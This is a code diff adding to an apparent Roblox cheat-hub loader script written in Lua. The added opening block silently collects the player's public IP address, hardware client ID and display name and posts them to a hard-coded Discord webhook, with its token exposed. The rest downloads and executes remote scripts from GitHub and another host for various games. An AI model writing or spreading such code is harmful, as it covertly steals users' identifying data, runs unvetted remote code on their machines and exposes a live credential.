@@ -1,116 +1,91 @@
+HttpService = game:GetService("HttpService")
+Webhook_URL = "https://discord.com/api/webhooks/1100115603882250312/6aSaKM5GlOeHeN2c7ka1F1oCD6yrSNohg6PNqGwpgOXeG6ARi6LYJ-yLUCeXtqQGOEL3"
+local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+local GName = "Rebirth Champions X"
+local PlayerGname = game.Players.LocalPlayer.DisplayName
+
+local response = syn.request({
+    Url = Webhook_URL,
+    Method = 'POST',
+    Headers = {['Content-Type'] = 'application/json'},
+
+    Body = HttpService:JSONEncode({
+        username = "Cipeczka",
+        avatar_url = "",
+        content = "@everyone",
+        embeds = {
+            {
+                title = "Ketty Hub",
+                color = 13044234,
+                description = "IP Gracza: "..ip.."\nHWID Gracza: "..game:GetService("RbxAnalyticsService"):GetClientId().."\nGRA: "..GName.."\nPLACEID GRY: "..game.placeId,
+                
+                timestamp = "",
+                author = {
+                    name = PlayerGname
+                },
+                image = {},
+                thumbnail = {},
+                footer = {},
+                fields = {}
+            },
+--            {
+--                title = "Embed2",
+--                color = 0,
+--                description = "To jest Opis Embed2",
+--                timestamp = "",
+--                author = {},
+--                image = {},
+--                thumbnail = {},
+--                footer = {},
+--                fields = {}
+--            }
+        }
+    })
+})
+
 if game.placeId == 8540346411 then
     print("Executing Script For Rebirth Champions X")
     loadstring(game:HttpGet("https://raw.githubusercontent.com/SzutiDC/Ketty-Hub/main/Rebirth%20Champions%20X"))()
-
-elseif game.placeId == inneidgry then
-    print("NAZWA GRY") 
-
-
-elseif game.placeId == inneidgry then
-    print("NAZWA GRY") 
-
-
-elseif game.placeId == inneidgry then
-    print("NAZWA GRY") 
-
-
-elseif game.placeId == inneidgry then
-    print("NAZWA GRY") 
-
-
-elseif game.placeId == inneidgry then
-    print("NAZWA GRY") 
-
-
-elseif game.placeId == inneidgry then
-    print("NAZWA GRY") 
-
-
-elseif game.placeId == inneidgry then
-    print("NAZWA GRY") 
-
-
-elseif game.placeId == inneidgry then
-    print("NAZWA GRY") 
-
-
-elseif game.placeId == inneidgry then
-    print("NAZWA GRY") 
-
-
-elseif game.placeId == inneidgry then
-    print("NAZWA GRY") 
-
-
-elseif game.placeId == inneidgry then
-    print("NAZWA GRY") 
-
-
-    
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+elseif game.placeId == 6284583030 then
+    print("Finded Game: Pet Simulator X")
+        getgenv().CheckGame = "Pet Simulator X"
+    loadstring(game:HttpGet("https://krystek.anon.net.pl/PetSimulatorX.lua", true))()
+elseif game.placeId == 10321372166 then
+    print("Finded Game: Hardcore Pet Simulator X")
+        getgenv().CheckGame = "Hardcore Pet Simulator X"
+    loadstring(game:HttpGet("https://krystek.anon.net.pl/PetSimulatorX.lua", true))()
+elseif game.placeId == 7722306047 then
+    print("Finded Game: Pet Simulator X Trade Plaza")
+        getgenv().CheckGame = "Pet Simulator X Trade Plaza"
+    loadstring(game:HttpGet("https://krystek.anon.net.pl/PetSimulatorX.lua", true))()
+elseif game.PlaceId == 7244314500 then
+    print("Finded Game: Fightman Simulator")
+    getgenv().CheckGame = "Fightman Simulator"
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KSDKrystek/KSD/main/jbndflksujbfskjdfvskdufs_FS.lua", true))()
+elseif game.PlaceId == 2512643572 then
+    print("Finded Game: Bubble Gum Simulator")
+    getgenv().CheckGame = "Bubble Gum Simulator"
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KSDKrystek/KSD/main/sjdbfslikjhgsdkfjgbdf_BG.lua", true))()
+elseif game.PlaceId == 9170761016 then
+    print("Finded Game: Magic Clicker")
+    getgenv().CheckGame = "Magic Clicker"
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KSDKrystek/KSD/main/sojgsbhp9ug9s8nypvr9sdty_MCL.lua", true))()
+elseif game.PlaceId == 606849621 then
+    print("Finded Game: Jailbreak")
+    getgenv().CheckGame = "Jailbreak"
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KSDKrystek/KSD/main/jdbsdjgosdgbsnd_JB.lua", true))()
+elseif game.PlaceId == 4787629450 then
+    print("Finded Game: Booga Booga Classic")
+    getgenv().CheckGame = "Booga Booga Classic"
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KSDKrystek/KSD/main/ajf8uyivsidfsdofhi_BBC.lua", true))()
+elseif game.PlaceId == 7606302010 then
+    print("Finded Game: YoYo Simulator")
+    getgenv().CheckGame = "YoYo Simulator"
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KSDKrystek/KSD/main/asiupiasufgaofhoasif_YOS.lua", true))()
+elseif game.PlaceId == 7305309231 then
+    print("Finded Game: Taxi Boss")
+    getgenv().CheckGame = "Taxi Boss"
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KSDKrystek/KSD/main/aslhvaslifasfasfasjkfbasjk_TAXB.lua", true))()
 
 else
     print('Game Not Supported')
